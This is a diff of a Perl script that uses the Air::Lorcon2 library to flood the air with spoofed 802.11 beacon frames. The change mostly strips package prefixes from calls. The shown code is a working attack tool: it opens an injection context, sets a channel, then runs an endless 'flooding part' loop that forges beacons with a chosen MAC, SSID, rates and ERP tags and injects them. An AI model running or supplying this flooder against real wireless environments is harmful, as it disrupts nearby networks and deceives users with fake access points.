@@ -25,35 +25,36 @@ my $capabilities = 0x0421;
 
 # create lorcon context
 
-my $drv = Air::Lorcon2::lorcon_find_driver( $driver ) or die $!; 
-my $context = Air::Lorcon2::lorcon_create( $interface, $driver ) or die $!;
+my $drv = lorcon_find_driver( $driver ) or die $!; 
+my $context = lorcon_create( $interface, $driver ) or die $!;
 
-Air::Lorcon2::lorcon_open_injmon( $context ) or die Air::Lorcon2::lorcon_get_error( $context );
-print "Current VAP is: " . Air::Lorcon2::lorcon_get_vap( $context );
+lorcon_open_injmon( $context ) or die lorcon_get_error( $context );
+print "Current VAP is: " . lorcon_get_vap( $context ); # return the name of the Virtual Access Point
 
 # set the channel
 
-Air::Lorcon2::lorcon_set_channel( $context, $channel ) or die Air::Lorcon2::lorcon_get_error( $context );
+lorcon_set_channel( $context, $channel ) or die Air::Lorcon2::lorcon_get_error( $context );
 
 # flooding part
 
 while(1){
 	my $timestamp = time * 1000; # implement better
-	my $meta = Air::Lorcon2::lcpa_init(); # create lcpa instance
-	Air::Lorcon2::lcpf_beacon( $meta, $mac, $mac, "0x00", "0x00", "0x00", "0x00", $timestamp, $Interval, $capabilities);
-	Air::Lorcon2::lcpf_add_ie( $meta, 0, length( $SSID ), $SSID ); 
-	Air::Lorcon2::lcpf_add_ie( $meta, 1, ( length( $rates ) -1 ), \$rates);
-	Air::Lorcon2::lcpf_add_ie( $meta, 3, 1, \$channel);
+	my $meta = lcpa_init(); # create lcpa instance
+	lcpf_beacon( $meta, $mac, $mac, "0x00", "0x00", "0x00", "0x00", $timestamp, $Interval, $capabilities);
+	lcpf_add_ie( $meta, 0, length( $SSID ), $SSID ); 
+	lcpf_add_ie( $meta, 1, ( length( $rates ) -1 ), \$rates);
+	lcpf_add_ie( $meta, 3, 1, \$channel);
 # Append IE Tags 42/47 for ERP Info 
-	Air::Lorcon2::lcpf_add_ie( $meta, 42, 1, "\x05");
-	Air::Lorcon2::lcpf_add_ie( $meta, 47, 1, "\x05");
+	lcpf_add_ie( $meta, 42, 1, "\x05");
+	lcpf_add_ie( $meta, 47, 1, "\x05");
 # Convert Lorcon metapack to lorcon packet	
-	my $packet = Air::Lorcon2::lorcon_packet_from_lcpa( $context, $meta );
-	Air::Lorcon2::lorcon_inject( $context, $packet ) or die Air::Lorcon2::lorcon_get_error( $context );
+	my $packet = lorcon_packet_from_lcpa( $context, $meta );
+	lorcon_inject( $context, $packet ) or die lorcon_get_error( $context );
 	print "Hit CTRL + C to stop...\r";
-	Air::Lorcon2::lcpa_free( $meta );
+	
+	lcpa_free( $meta );
 }
 
 
-Air::Lorcon2::lorcon_close( $context );
-Air::Lorcon2::lorcon_free( $context );
+lorcon_close( $context );
+lorcon_free( $context );
